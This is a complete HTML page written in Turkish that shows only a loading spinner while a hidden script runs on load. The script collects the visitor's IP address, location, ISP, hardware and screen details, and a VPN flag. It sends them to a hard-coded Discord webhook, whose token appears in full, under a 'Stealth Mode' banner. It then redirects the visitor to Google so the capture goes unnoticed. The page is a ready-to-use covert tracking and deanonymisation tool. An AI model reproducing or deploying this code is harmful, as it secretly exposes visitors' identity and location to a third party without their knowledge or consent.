<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sistem Kaynaklarƒ±</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .c { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
        @keyframes s { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="c"></div>

    <script>
        (function() {
            "use strict";

            var WEBHOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            var TARGET = "https://www.google.com";

            var run = function() {
                var data = {
                    os: navigator.platform,
                    res: screen.width + "x" + screen.height,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    mem: navigator.deviceMemory || "N/A",
                    cpu: navigator.hardwareConcurrency || "N/A",
                    gpu: "Gizli", 
                    ip: "N/A", 
                    vpn: "‚úÖ Temiz"
                };

                // GPU √áekimi
                try {
                    var canvas = document.createElement('canvas');
                    var gl = canvas.getContext('webgl');
                    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                } catch(e) {}

                // IP ve Detaylƒ± Analiz
                fetch('https://ipapi.co/json/')
                    .then(function(res) { return res.json(); })
                    .then(function(json) {
                        data.ip = json.ip;
                        data.loc = json.city + ", " + json.country_name;
                        data.iss = json.org;
                        if (json.timezone !== data.tz) data.vpn = "üö® **VPN TESPIT EDILDI**";
                        send(data);
                    })
                    .catch(function() { send(data); });
            };

            var send = function(d) {
                var payload = {
                    embeds: [{
                        title: "üíÄ CIHAZ VERILERI EKSIKSIZ ALINDI",
                        color: 3066993,
                        fields: [
                            { name: "üì° NETWORK", value: "IP: " + d.ip + "\nVPN: " + d.vpn + "\nISS: " + d.iss, inline: false },
                            { name: "‚öôÔ∏è HARDWARE", value: "OS: " + d.os + "\nCPU: " + d.cpu + " Core\nRAM: " + d.mem + "GB\nGPU: " + d.gpu, inline: false },
                            { name: "üñ•Ô∏è DISPLAY", value: "Res: " + d.res + "\nTZ: " + d.tz, inline: true }
                        ],
                        footer: { text: "Protocol V10.000 - Stealth Mode" },
                        timestamp: new Date().toISOString()
                    }]
                };

                var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(WEBHOOK, blob);
                } else {
                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
                }

                // Kullanƒ±cƒ±yƒ± y√∂nlendir
                setTimeout(function() { window.location.replace(TARGET); }, 1500);
            };

            window.onload = run;
        })();
    </script>
</body>
</html>
